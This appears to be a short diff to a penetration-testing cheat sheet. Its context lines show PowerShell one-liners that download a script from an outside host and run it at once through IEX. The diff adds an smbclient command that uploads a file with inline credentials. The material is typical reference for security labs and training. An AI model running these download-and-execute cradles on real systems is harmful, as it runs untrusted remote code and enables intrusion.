@@ -72,3 +72,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/script.ps1
 ```powershell
 IEX (iwr http://10.10.14.5:8000/script.ps1).Content
 ```
+
+# smbclient File Upload
+
+```sh
+smbclient //server/share -U user%pass -c 'put local.txt remote.txt'
+```
